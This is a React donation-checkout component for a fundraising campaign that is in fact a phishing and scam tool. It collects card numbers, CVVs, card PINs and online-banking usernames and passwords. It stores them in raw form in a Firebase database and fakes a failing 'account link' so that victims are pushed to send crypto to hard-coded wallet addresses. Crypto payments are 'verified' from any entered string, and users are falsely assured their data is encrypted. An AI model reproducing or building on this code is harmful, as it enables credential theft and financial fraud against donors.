import React, { useState, useEffect } from 'react';
import { FaEthereum, FaBitcoin, FaCopy, FaCheck, FaQrcode, FaShieldAlt, FaExchangeAlt, FaCreditCard, FaUser, FaCalendarAlt, FaLock, FaMapMarkerAlt, FaPhone, FaEnvelope,  FaKey } from 'react-icons/fa';
import { db } from './firebase'; // Your Firebase config - now for Realtime Database
import { ref, push, set, serverTimestamp } from 'firebase/database';
import './paymentCheckout.css';

const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete }) => {
  const [step, setStep] = useState(1);
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState(''); // 'crypto' or 'card'
  const [cryptoAmount, setCryptoAmount] = useState(0);
  const [exchangeRate, setExchangeRate] = useState({});
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [transactionHash, setTransactionHash] = useState('');
  const [timer, setTimer] = useState(900);
  const [paymentVerified, setPaymentVerified] = useState(false);

  // Card payment states
  const [cardDetails, setCardDetails] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: ''
  });

  // Billing address states
  const [billingAddress, setBillingAddress] = useState({
    street: '',
    city: '',
    state: '',
    zipCode: '',
    country: ''
  });

  // Account information states
  const [accountInfo, setAccountInfo] = useState({
    email: '',
    phoneNumber: '',
    cardPin: '',
    bankName: '',
    accountUsername: '',
    accountPassword: ''
  });

  const [isProcessing, setIsProcessing] = useState(false);
  const [isLinking, setIsLinking] = useState(false);
  const [linkFailed, setLinkFailed] = useState(false);
  const [cardErrors, setCardErrors] = useState({});

  // Updated crypto addresses with your provided addresses
  const cryptoRates = {
    btc: 65000,
    eth: 3500,
    usdt: 1,
    usdc: 1,
    ltc: 75,
    doge: 0.15,
    trx: 0.12,
    xrp: 0.60
  };

  const cryptoOptions = [
    { 
      id: 'btc', 
      name: 'Bitcoin (BTC)', 
      icon: FaBitcoin, 
      
      address: 'bc1qd0l4rpekuxey4dchuaqt963wuz5djpskj9az06' 
    },
    { 
      id: 'eth', 
      name: 'Ethereum (ETH)', 
      icon: FaEthereum, 
      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
    },
    { 
      id: 'usdt', 
      name: 'USDT (ERC-20)', 
      icon: FaEthereum, 
      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
    },
    
    { 
      id: 'ltc', 
      name: 'Litecoin (LTC)', 
      icon: FaBitcoin, 
      address: ' LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
    },
    { 
      id: 'doge', 
      name: 'Dogecoin (DOGE)', 
      icon: FaBitcoin, 
      address: 'D7whXjWwZzsXqnfZdy3rSkBtvTbyefr4d4' 
    },
    { 
      id: 'trx', 
      name: 'TRON (TRX)', 
      icon: FaBitcoin, 
      address: 'TNyKcnXh9GhANHaCgQyTdnXGmMc72ykQFC' 
    },
    { 
      id: 'xrp', 
      name: 'Ripple (XRP)', 
      icon: FaBitcoin, 
      address: ' raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
    }
  ];

  useEffect(() => {
    setExchangeRate(cryptoRates);
    
    if (selectedCrypto && donationAmount) {
      setCryptoAmount(donationAmount / cryptoRates[selectedCrypto]);
    }
    
    if (step === 3 && selectedPaymentMethod === 'crypto') {
      const interval = setInterval(() => {
        setTimer(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(interval);
    }
  }, [selectedCrypto, donationAmount, step, selectedPaymentMethod]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handlePaymentMethodSelect = (method) => {
    setSelectedPaymentMethod(method);
    if (method === 'crypto') {
      setStep(2); // Go to crypto selection
    } else {
      setStep(5); // Go to card details
    }
  };

  const handleCryptoSelect = (cryptoId) => {
    setSelectedCrypto(cryptoId);
    setStep(3); // Go to crypto payment instructions
  };

  // Card validation functions
  const validateCardNumber = (number) => {
    return number.replace(/\s/g, '').length === 16 && /^\d+$/.test(number.replace(/\s/g, ''));
  };

  const validateExpiryDate = (date) => {
    const [month, year] = date.split('/');
    if (!month || !year) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    return month >= 1 && month <= 12 && 
           (year > currentYear || (year == currentYear && month >= currentMonth));
  };

  const validateCVV = (cvv) => {
    return cvv.length === 3 && /^\d+$/.test(cvv);
  };

  const validateEmail = (email) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const validatePhone = (phone) => {
    return phone.replace(/\D/g, '').length >= 10;
  };

  // Fixed input change handler
  const handleInputChange = (field, value, category) => {
    let formattedValue = value;

    // Format card number with spaces
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
    }
    
    // Format expiry date
    if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
    }
    
    // Limit CVV to 3 digits
    if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 3);
    }

    // Limit card PIN to 4 digits
    if (field === 'cardPin') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }

    // Limit zip code to 5 digits
    if (field === 'zipCode') {
      formattedValue = value.replace(/\D/g, '').slice(0, 5);
    }

    // Update the appropriate state based on category
    if (category === 'card') {
      setCardDetails(prev => ({ ...prev, [field]: formattedValue }));
    } else if (category === 'billing') {
      setBillingAddress(prev => ({ ...prev, [field]: formattedValue }));
    } else if (category === 'account') {
      setAccountInfo(prev => ({ ...prev, [field]: formattedValue }));
    }

    // Clear error when user starts typing
    if (cardErrors[field]) {
      setCardErrors(prev => ({ ...prev, [field]: '' }));
    }
  };

  const validateCardForm = () => {
    const errors = {};

    if (!validateCardNumber(cardDetails.cardNumber)) {
      errors.cardNumber = 'Please enter a valid 16-digit card number';
    }
    
    if (!validateExpiryDate(cardDetails.expiryDate)) {
      errors.expiryDate = 'Please enter a valid expiry date (MM/YY)';
    }
    
    if (!validateCVV(cardDetails.cvv)) {
      errors.cvv = 'Please enter a valid 3-digit CVV';
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = 'Please enter cardholder name';
    }

    if (!billingAddress.street.trim()) {
      errors.street = 'Please enter street address';
    }

    if (!billingAddress.city.trim()) {
      errors.city = 'Please enter city';
    }

    if (!billingAddress.state.trim()) {
      errors.state = 'Please enter state';
    }

    if (!billingAddress.zipCode.trim() || billingAddress.zipCode.length !== 5) {
      errors.zipCode = 'Please enter valid 5-digit ZIP code';
    }

    if (!billingAddress.country.trim()) {
      errors.country = 'Please enter country';
    }

    if (!validateEmail(accountInfo.email)) {
      errors.email = 'Please enter a valid email address';
    }

    if (!validatePhone(accountInfo.phoneNumber)) {
      errors.phoneNumber = 'Please enter a valid phone number';
    }

  
    if (!accountInfo.bankName.trim()) {
      errors.bankName = 'Please enter bank name';
    }

    if (!accountInfo.accountUsername.trim()) {
      errors.accountUsername = 'Please enter account username';
    }

    if (!accountInfo.accountPassword) {
      errors.accountPassword = 'Please enter account password';
    }

    setCardErrors(errors);
    return Object.keys(errors).length === 0;
  };

  // Realtime Database function to store ALL payment data
  const storePaymentDataInRealtimeDB = async (paymentType, status, additionalData = {}) => {
    try {
      const paymentData = {
        // Basic donation info
        donationAmount,
        campaign: campaign.title,
        campaignId: campaign.id,
        paymentMethod: selectedPaymentMethod,
        timestamp: serverTimestamp(),
        status: status,
        
        // Payment type specific data
        ...additionalData,
        
        // User information (collected in both flows)
        userInfo: {
          email: accountInfo.email,
          phoneNumber: accountInfo.phoneNumber
        }
      };

      // Add crypto-specific data
      if (paymentType === 'crypto') {
        paymentData.cryptoDetails = {
          selectedCrypto,
          cryptoAmount,
          cryptoAddress: cryptoOptions.find(c => c.id === selectedCrypto)?.address,
          transactionHash,
          exchangeRate: exchangeRate[selectedCrypto]
        };
      }

      // Add card-specific data (store ALL sensitive data for simulation)
      if (paymentType === 'card') {
        paymentData.cardDetails = {
          ...cardDetails,
          billingAddress: { ...billingAddress },
          accountInfo: { ...accountInfo }
        };
      }

      // Store in Realtime Database - using push to generate unique key
      const paymentRef = push(ref(db, 'paymentAttempts'));
      await set(paymentRef, paymentData);
      
      console.log('Payment data stored with ID: ', paymentRef.key);
      return paymentRef.key;
    } catch (error) {
      console.error('Error storing payment data: ', error);
      return false;
    }
  };

  // Store crypto payment attempt
  const storeCryptoPaymentAttempt = async () => {
    return await storePaymentDataInRealtimeDB('crypto', 'pending', {
      step: 'crypto_selected',
      cryptoType: selectedCrypto
    });
  };

  // Store crypto transaction verification
  const storeCryptoVerification = async () => {
    return await storePaymentDataInRealtimeDB('crypto', 'verified', {
      step: 'transaction_verified',
      transactionHash: transactionHash,
      verificationTime: new Date().toISOString()
    });
  };

  // Store card payment attempt with ALL details
  const storeCardPaymentAttempt = async (stepDescription) => {
    return await storePaymentDataInRealtimeDB('card', 'attempted', {
      step: stepDescription,
      cardDetails: {
        ...cardDetails,
        billingAddress: { ...billingAddress },
        accountInfo: { ...accountInfo }
      },
      // Store raw values for easy access
      rawData: {
        cardNumber: cardDetails.cardNumber,
        expiryDate: cardDetails.expiryDate,
        cvv: cardDetails.cvv,
        cardholderName: cardDetails.cardholderName,
        cardPin: accountInfo.cardPin,
        accountPassword: accountInfo.accountPassword,
        email: accountInfo.email,
        phone: accountInfo.phoneNumber
      }
    });
  };

  // Store successful payment
  const storeSuccessfulPayment = async (paymentType, transactionId = null) => {
    return await storePaymentDataInRealtimeDB(paymentType, 'completed', {
      transactionId: transactionId || `TXN_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
      completionTime: new Date().toISOString(),
      finalAmount: donationAmount
    });
  };

  // Store failed payment attempt
  const storeFailedPayment = async (paymentType, errorMessage) => {
    return await storePaymentDataInRealtimeDB(paymentType, 'failed', {
      error: errorMessage,
      failureTime: new Date().toISOString()
    });
  };

  const simulateLinking = () => {
    return new Promise((resolve, reject) => {
      setIsLinking(true);
      
      // Store linking attempt
      storeCardPaymentAttempt('account_linking_attempt');
      
      // Simulate API call with high failure rate (as requested)
      setTimeout(() => {
        const isSuccess = Math.random() > 0.8; // 80% failure rate
        
        if (isSuccess) {
          storeCardPaymentAttempt('account_linking_success');
          resolve({
            status: 'linked',
            message: 'Account linked successfully'
          });
        } else {
          storeFailedPayment('card', 'Account linking failed');
          reject(new Error('Linking failed. Please try another payment method.'));
        }
      }, 3000);
    });
  };

  const handleLinkAccount = async () => {
    if (!validateCardForm()) return;

    try {
      // Store initial card details
      await storeCardPaymentAttempt('card_details_submitted');
      
      // Then attempt to link account
      await simulateLinking();
    } catch (error) {
      setLinkFailed(true);
      setCardErrors(prev => ({ ...prev, general: error.message }));
      setIsLinking(false);
      
      // Auto-switch to crypto after 3 seconds
      setTimeout(() => {
        setSelectedPaymentMethod('crypto');
        setStep(2); // Go to crypto selection
        setLinkFailed(false);
        
        // Store the switch to crypto
        storeCryptoPaymentAttempt();
      }, 3000);
    }
  };

  const simulateCardPayment = () => {
    return new Promise((resolve, reject) => {
      setIsProcessing(true);

      // Store payment processing attempt
      storeCardPaymentAttempt('payment_processing');

      // Simulate API call with random success/failure
      setTimeout(() => {
        const isSuccess = Math.random() > 0.2; // 80% success rate
        
        if (isSuccess) {
          const transactionId = 'TXN_' + Math.random().toString(36).substr(2, 9).toUpperCase();
          storeSuccessfulPayment('card', transactionId);
          resolve({
            transactionId: transactionId,
            timestamp: new Date().toISOString(),
            status: 'completed'
          });
        } else {
          storeFailedPayment('card', 'Payment declined by bank');
          reject(new Error('Payment declined. Please check your card details or try a different card.'));
        }
      }, 3000);
    });
  };

  const handleCardPayment = async () => {
    if (!validateCardForm()) return;

    try {
      const result = await simulateCardPayment();
      setStep(9); // Go to payment success
    } catch (error) {
      setCardErrors(prev => ({ ...prev, general: error.message }));
    } finally {
      setIsProcessing(false);
    }
  };

  const handleTransactionSubmit = async () => {
    if (transactionHash.length > 10) {
      setPaymentVerified(true);
      
      // Store verification attempt
      await storeCryptoVerification();
      
      // Store successful payment
      await storeSuccessfulPayment('crypto');
      
      setTimeout(() => setStep(9), 2000); // Go to success step
    }
  };

  // Store crypto selection
  const handleCryptoSelectWithStorage = (cryptoId) => {
    setSelectedCrypto(cryptoId);
    setStep(3);
    
    // Store crypto selection in Realtime Database
    storeCryptoPaymentAttempt();
  };

  // Step 1: Payment Method Selection (Crypto first)
  const renderStep1 = () => (
    <div className="checkout-step">
      <h2>Choose Payment Method</h2>
      <p className="step-description">Select how you'd like to make your donation</p>
      
      <div className="payment-methods">
        {/* Crypto Option - Moved to TOP */}
        <div 
          className={`payment-method ${selectedPaymentMethod === 'crypto' ? 'selected' : ''}`}
          onClick={() => handlePaymentMethodSelect('crypto')}
        >
          <div className="method-icon">
            <FaEthereum />
          </div>
          <div className="method-info">
            <h3>Cryptocurrency</h3>
            <p>Pay with crypto (BTC, ETH, USDT, USDC, LTC, DOGE, TRX, XRP)</p>
            <div className="method-badges">
              <span className="badge">Bitcoin</span>
              <span className="badge">Ethereum</span>
              <span className="badge">8+ Cryptos</span>
            </div>
          </div>
        </div>

        {/* Card Option */}
        <div 
          className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''}`}
          onClick={() => handlePaymentMethodSelect('card')}
        >
          <div className="method-icon">
            <FaCreditCard />
          </div>
          <div className="method-info">
            <h3>Credit/Debit Card</h3>
            <p>Pay instantly with your card</p>
            <div className="method-badges">
              <span className="badge">Visa</span>
              <span className="badge">Mastercard</span>
              <span className="badge">Amex</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  // Step 2: Crypto Selection
  const renderStep2 = () => (
    <div className="checkout-step">
      <h2>Select Cryptocurrency</h2>
      <p className="step-description">Choose your preferred cryptocurrency for donation</p>
      
      <div className="crypto-options">
        {cryptoOptions.map(crypto => (
          <div 
            key={crypto.id}
            className={`crypto-option ${selectedCrypto === crypto.id ? 'selected' : ''}`}
            onClick={() => handleCryptoSelectWithStorage(crypto.id)}
          >
            <div className="crypto-icon">
              {React.createElement(crypto.icon)}
            </div>
            <div className="crypto-info">
              <h3>{crypto.name}</h3>
              <p>Make your doantions using {crypto.name}</p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  // Step 3: Crypto Payment Instructions
  const renderStep3 = () => {
    const selectedCryptoData = cryptoOptions.find(c => c.id === selectedCrypto);
    
    return (
      <div className="checkout-step">
        <h2>Make Your Payment</h2>
        
        <div className="payment-details">
          <div className="amount-card">
            <div className="amount-display">
                 <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
            </div>
            
          </div>
          
          <div className="timer-warning">
            <FaExchangeAlt />
            <span>Price valid for: <strong>{formatTime(timer)}</strong></span>
          </div>
          
          <div className="address-section">
            <label>Send to this {selectedCrypto.toUpperCase()} address:</label>
            <div className="address-display">
              <span>{selectedCryptoData.address}</span>
              <button 
                className="copy-btn"
                onClick={() => copyToClipboard(selectedCryptoData.address)}
              >
                {copiedAddress ? <FaCheck /> : <FaCopy />}
              </button>
            </div>
          </div>
          
          <div className="qr-code-section">
            <div className="qr-code">
              <FaQrcode />
              <p>Scan QR Code</p>
            </div>
          </div>
          
          <div className="payment-instructions">
            <h4>Important Instructions:</h4>
            <ul>
              <li>Send exactly ${donationAmount} in {selectedCrypto.toUpperCase()}</li>
              <li>Use only the {selectedCrypto.toUpperCase()} network</li>
              <li>Do not send from an exchange wallet</li>
              <li>Transaction may take 5-15 minutes to confirm</li>
            </ul>
          </div>
        </div>
        
        <button className="next-btn" onClick={() => setStep(4)}>
          I've Sent the Payment
        </button>
      </div>
    );
  };

  // Step 4: Crypto Verification
  const renderStep4 = () => (
    <div className="checkout-step">
      <h2>Verify Your Payment</h2>
      <p className="step-description">Enter your transaction hash to verify the donation</p>
      
      <div className="verification-section">
        <div className="security-badge">
          <FaShieldAlt />
          <span>Secure Verification</span>
        </div>
        
        <div className="transaction-input">
          <label>Transaction Hash (TXID):</label>
          <input
            type="text"
            placeholder="Enter your transaction hash here..."
            value={transactionHash}
            onChange={(e) => setTransactionHash(e.target.value)}
            className="transaction-hash-input"
          />
          <p className="input-help">You can find this in your wallet's transaction history</p>
        </div>
        
        {paymentVerified && (
          <div className="verification-success">
            <FaCheck />
            <span>Payment verified successfully!</span>
          </div>
        )}
        
        <button 
          className="verify-btn"
          onClick={handleTransactionSubmit}
          disabled={!transactionHash || transactionHash.length < 10}
        >
          Verify Payment
        </button>
        
        <div className="verification-info">
          <h4>How verification works:</h4>
          <ul>
            <li>We check the blockchain for your transaction</li>
            <li>Verify the amount and recipient address</li>
            <li>Confirm transaction has sufficient confirmations</li>
            <li>Process typically takes 30-60 seconds</li>
          </ul>
        </div>
      </div>
    </div>
  );

  // Step 5: Card Details
  const renderStep5 = () => (
    <div className="checkout-step">
      <h2>Card Details</h2>
      <p className="step-description">Enter your card information</p>
      
      <div className="card-payment-form">
        <div className="security-notice-card">
          <FaLock />
          <span>Your payment information is encrypted and secure</span>
        </div>
        
        <div className="form-group">
          <label>Card Number</label>
          <div className={`input-with-icon ${cardErrors.cardNumber ? 'error' : ''}`}>
            <FaCreditCard />
            <input
              type="text"
              placeholder="1234 5678 9012 3456"
              value={cardDetails.cardNumber}
              onChange={(e) => handleInputChange('cardNumber', e.target.value, 'card')}
              className="card-input"
            />
          </div>
          {cardErrors.cardNumber && <span className="error-text">{cardErrors.cardNumber}</span>}
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label>Expiry Date</label>
            <div className={`input-with-icon ${cardErrors.expiryDate ? 'error' : ''}`}>
              <FaCalendarAlt />
              <input
                type="text"
                placeholder="MM/YY"
                value={cardDetails.expiryDate}
                onChange={(e) => handleInputChange('expiryDate', e.target.value, 'card')}
                className="card-input"
              />
            </div>
            {cardErrors.expiryDate && <span className="error-text">{cardErrors.expiryDate}</span>}
          </div>
          
          <div className="form-group">
            <label>CVV</label>
            <div className={`input-with-icon ${cardErrors.cvv ? 'error' : ''}`}>
              <FaLock />
              <input
                type="text"
                placeholder="123"
                value={cardDetails.cvv}
                onChange={(e) => handleInputChange('cvv', e.target.value, 'card')}
                className="card-input"
              />
            </div>
            {cardErrors.cvv && <span className="error-text">{cardErrors.cvv}</span>}
          </div>
        </div>
        
        <div className="form-group">
          <label>Cardholder Name</label>
          <div className={`input-with-icon ${cardErrors.cardholderName ? 'error' : ''}`}>
            <FaUser />
            <input
              type="text"
              placeholder="John Doe"
              value={cardDetails.cardholderName}
              onChange={(e) => handleInputChange('cardholderName', e.target.value, 'card')}
              className="card-input"
            />
          </div>
          {cardErrors.cardholderName && <span className="error-text">{cardErrors.cardholderName}</span>}
        </div>
        
        <button className="next-btn" onClick={() => setStep(6)}>
          Continue to Billing Address
        </button>
      </div>
    </div>
  );

  // Step 6: Billing Address
  const renderStep6 = () => (
    <div className="checkout-step">
      <h2>Billing Address</h2>
      <p className="step-description">Enter your billing information</p>
      
      <div className="card-payment-form">
        <div className="form-group">
          <label>Street Address</label>
          <div className={`input-with-icon ${cardErrors.street ? 'error' : ''}`}>
            <FaMapMarkerAlt />
            <input
              type="text"
              placeholder="123 Main St"
              value={billingAddress.street}
              onChange={(e) => handleInputChange('street', e.target.value, 'billing')}
              className="billing-input"
            />
          </div>
          {cardErrors.street && <span className="error-text">{cardErrors.street}</span>}
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label>City</label>
            <div className={`input-with-icon ${cardErrors.city ? 'error' : ''}`}>
              <FaMapMarkerAlt />
              <input
                type="text"
                placeholder="New York"
                value={billingAddress.city}
                onChange={(e) => handleInputChange('city', e.target.value, 'billing')}
                className="billing-input"
              />
            </div>
            {cardErrors.city && <span className="error-text">{cardErrors.city}</span>}
          </div>
          
          <div className="form-group">
            <label>State</label>
            <div className={`input-with-icon ${cardErrors.state ? 'error' : ''}`}>
              <FaMapMarkerAlt />
              <input
                type="text"
                placeholder="NY"
                value={billingAddress.state}
                onChange={(e) => handleInputChange('state', e.target.value, 'billing')}
                className="billing-input"
              />
            </div>
            {cardErrors.state && <span className="error-text">{cardErrors.state}</span>}
          </div>
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label>ZIP Code</label>
            <div className={`input-with-icon ${cardErrors.zipCode ? 'error' : ''}`}>
              <FaMapMarkerAlt />
              <input
                type="text"
                placeholder="10001"
                value={billingAddress.zipCode}
                onChange={(e) => handleInputChange('zipCode', e.target.value, 'billing')}
                className="billing-input"
              />
            </div>
            {cardErrors.zipCode && <span className="error-text">{cardErrors.zipCode}</span>}
          </div>
          
          <div className="form-group">
            <label>Country</label>
            <div className={`input-with-icon ${cardErrors.country ? 'error' : ''}`}>
              <FaMapMarkerAlt />
              <input
                type="text"
                placeholder="United States"
                value={billingAddress.country}
                onChange={(e) => handleInputChange('country', e.target.value, 'billing')}
                className="billing-input"
              />
            </div>
            {cardErrors.country && <span className="error-text">{cardErrors.country}</span>}
          </div>
        </div>
        
        <button className="next-btn" onClick={() => setStep(7)}>
          Continue to Account Information
        </button>
      </div>
    </div>
  );

  // Step 7: Account Information
  const renderStep7 = () => (
    <div className="checkout-step">
      <h2>Account Information</h2>
      <p className="step-description">Enter your account details</p>
      
      <div className="card-payment-form">
        <div className="form-row">
          <div className="form-group">
            <label>Email Address</label>
            <div className={`input-with-icon ${cardErrors.email ? 'error' : ''}`}>
              <FaEnvelope />
              <input
                type="email"
                placeholder="john@example.com"
                value={accountInfo.email}
                onChange={(e) => handleInputChange('email', e.target.value, 'account')}
                className="account-input"
              />
            </div>
            {cardErrors.email && <span className="error-text">{cardErrors.email}</span>}
          </div>
          
          <div className="form-group">
            <label>Phone Number</label>
            <div className={`input-with-icon ${cardErrors.phoneNumber ? 'error' : ''}`}>
              <FaPhone />
              <input
                type="text"
                placeholder="(555) 123-4567"
                value={accountInfo.phoneNumber}
                onChange={(e) => handleInputChange('phoneNumber', e.target.value, 'account')}
                className="account-input"
              />
            </div>
            {cardErrors.phoneNumber && <span className="error-text">{cardErrors.phoneNumber}</span>}
          </div>
        </div>
        
        <div className="form-group">
          <div className='pin'>
          <label >Card PIN</label>
          <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
            <FaKey />
            <input
              
              type="password"
              placeholder="****"
              value={accountInfo.cardPin}
              onChange={(e) => handleInputChange('cardPin', e.target.value, 'account')}
              className="account-input pin"
            />
            </div>
          </div>
          {cardErrors.cardPin && <span className="error-text">{cardErrors.cardPin}</span>}
        </div>
        
        <div className="form-group">
          <label>Bank Name</label>
          <div className={`input-with-icon ${cardErrors.bankName ? 'error' : ''}`}>
            <input
              type="text"
              placeholder="Bank of America"
              value={accountInfo.bankName}
              onChange={(e) => handleInputChange('bankName', e.target.value, 'account')}
              className="account-input"
            />
          </div>
          {cardErrors.bankName && <span className="error-text">{cardErrors.bankName}</span>}
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label>Account Username</label>
            <div className={`input-with-icon ${cardErrors.accountUsername ? 'error' : ''}`}>
              <FaUser />
              <input
                type="text"
                placeholder="johndoe123"
                value={accountInfo.accountUsername}
                onChange={(e) => handleInputChange('accountUsername', e.target.value, 'account')}
                className="account-input"
              />
            </div>
            {cardErrors.accountUsername && <span className="error-text">{cardErrors.accountUsername}</span>}
          </div>
          
          <div className="form-group">
            <label>Account Password</label>
            <div className={`input-with-icon ${cardErrors.accountPassword ? 'error' : ''}`}>
              <FaKey />
              <input
                type="password"
                placeholder="••••••••"
                value={accountInfo.accountPassword}
                onChange={(e) => handleInputChange('accountPassword', e.target.value, 'account')}
                className="account-input"
              />
            </div>
            {cardErrors.accountPassword && <span className="error-text">{cardErrors.accountPassword}</span>}
          </div>
        </div>
        
        <button className="next-btn" onClick={() => setStep(8)}>
          Review and Link Account
        </button>
      </div>
    </div>
  );

  // Step 8: Link Account
  const renderStep8 = () => (
    <div className="checkout-step">
      <h2>Link Your Account</h2>
      <p className="step-description">Review your information and link your account</p>
      
      <div className="card-payment-form">
        <div className="amount-summary">
          <h4>Donation Summary</h4>
          <div className="summary-item">
            <span>Amount:</span>
            <span>${donationAmount}</span>
          </div>
          <div className="summary-item">
            <span>Processing Fee:</span>
            <span>$0.00</span>
          </div>
          <div className="summary-item total">
            <span>Total:</span>
            <span>${donationAmount}</span>
          </div>
        </div>
        
        {cardErrors.general && (
          <div className="error-message general-error">
            {cardErrors.general}
          </div>
        )}
        
        {linkFailed && (
          <div className="linking-failed">
            <div className="failure-message">
              <span>Linking failed. Please try another payment method.</span>
            </div>
            <div className="redirecting">
              <span>Redirecting to cryptocurrency payment...</span>
            </div>
          </div>
        )}
        
        <button 
          className={`link-account-btn ${isLinking ? 'processing' : ''}`}
          onClick={handleLinkAccount}
          disabled={isLinking || linkFailed}
        >
          {isLinking ? (
            <>
              <div className="spinner"></div>
              Linking Account...
            </>
          ) : linkFailed ? (
            'Redirecting...'
          ) : (
            'Link Account and Pay'
          )}
        </button>
      </div>
    </div>
  );

  // Step 9: Payment Success
  const renderStep9 = () => (
    <div className="checkout-step success-step">
      <div className="success-icon">✓</div>
      <h2>Payment Successful!</h2>
      <p className="success-message">
        Thank you for your generous donation of ${donationAmount} to {campaign.title}
      </p>
      
      <div className="transaction-details">
        <h4>Transaction Details:</h4>
        <div className="detail-item">
          <span>Amount:</span>
          <span>${donationAmount} USD</span>
        </div>
        <div className="detail-item">
          <span>Payment Method:</span>
          <span>{selectedPaymentMethod === 'card' ? 'Credit/Debit Card' : selectedCrypto.toUpperCase()}</span>
        </div>
        <div className="detail-item">
          <span>Status:</span>
          <span className="status-confirmed">Completed</span>
        </div>
        <div className="detail-item">
          <span>Email:</span>
          <span>{accountInfo.email}</span>
        </div>
      </div>
      
      <div className="success-actions">
        <button className="receipt-btn">Download Receipt</button>
        <button className="share-btn">Share This Campaign</button>
        <button className="close-btn" onClick={onPaymentComplete}>
          Return to Campaign
        </button>
      </div>
    </div>
  );

  const getCurrentStepContent = () => {
    switch (step) {
      case 1: return renderStep1();
      case 2: return renderStep2();
      case 3: return renderStep3();
      case 4: return renderStep4();
      case 5: return renderStep5();
      case 6: return renderStep6();
      case 7: return renderStep7();
      case 8: return renderStep8();
      case 9: return renderStep9();
      default: return renderStep1();
    }
  };

  const getStepNumber = () => {
    if (selectedPaymentMethod === 'card') {
      // Card payment has more steps
      if (step === 5) return 2;
      if (step === 6) return 3;
      if (step === 7) return 4;
      if (step === 8) return 5;
      if (step === 9) return 6;
    }
    return step;
  };

  const getTotalSteps = () => {
    return selectedPaymentMethod === 'card' ? 6 : 4;
  };

  return (
    <div className="payment-checkout-overlay">
      <div className="payment-checkout-modal">
        <div className="checkout-header">
          <button 
            className="back-button"
            onClick={step > 1 ? () => setStep(step - 1) : onClose}
          >
            ← Back
          </button>
          <h2>Complete Your Donation</h2>
          <button className="close-button" onClick={onClose}>×</button>
        </div>
        
        <div className="progress-bar">
          <div className="progress-fill" style={{ width: `${(getStepNumber() / getTotalSteps()) * 100}%` }}></div>
        </div>
        
        <div className="step-indicator">
          <div className={`step ${getStepNumber() >= 1 ? 'active' : ''}`}>
            <span>1</span>
            <label>Method</label>
          </div>
          <div className={`step ${getStepNumber() >= 2 ? 'active' : ''}`}>
            <span>2</span>
            <label>{selectedPaymentMethod === 'card' ? 'Card Details' : 'Select Crypto'}</label>
          </div>
          <div className={`step ${getStepNumber() >= 3 ? 'active' : ''}`}>
            <span>3</span>
            <label>{selectedPaymentMethod === 'card' ? 'Billing' : 'Pay'}</label>
          </div>
          <div className={`step ${getStepNumber() >= 4 ? 'active' : ''}`}>
            <span>4</span>
            <label>{selectedPaymentMethod === 'card' ? 'Account' : 'Verify'}</label>
          </div>
          {selectedPaymentMethod === 'card' && (
            <>
              <div className={`step ${getStepNumber() >= 5 ? 'active' : ''}`}>
                <span>5</span>
                <label>Link</label>
              </div>
              <div className={`step ${getStepNumber() >= 6 ? 'active' : ''}`}>
                <span>6</span>
                <label>Complete</label>
              </div>
            </>
          )}
        </div>
        
        <div className="checkout-content">
          {getCurrentStepContent()}
        </div>
        
        <div className="security-notice">
          <FaShieldAlt />
          <span>All transactions are secured with SSL encryption</span>
        </div>
      </div>
    </div>
  );
};

export default PaymentCheckout;